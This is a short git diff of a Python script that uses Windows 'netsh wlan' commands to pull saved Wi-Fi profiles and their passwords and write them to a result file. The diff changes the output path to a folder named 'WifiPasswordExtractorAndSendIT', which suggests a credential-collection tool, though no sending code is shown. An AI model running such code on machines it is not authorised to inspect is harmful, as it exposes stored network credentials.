@@ -1,5 +1,6 @@
 import subprocess
 import json
+import os
 
 wifidata = subprocess.check_output(["netsh","wlan", "show", "profiles"]).decode(encoding="utf-8").split("\n")
 wifionly = [line.split(":")[1][1:-1] for line in wifidata if "All User Profile" in line ]
@@ -16,7 +17,7 @@ for wifi in wifionly:
     except: 
         allWifiInfo[IdWifi] = "Password Cannot Be found"
 
-with open("result.txt","w") as fuf:
+with open(os.getcwd() + "/WifiPasswordExtractorAndSendIT/result.txt","w") as fuf:
     fuf.write(json.dumps(allWifiInfo))
     
 print("Done yak ")
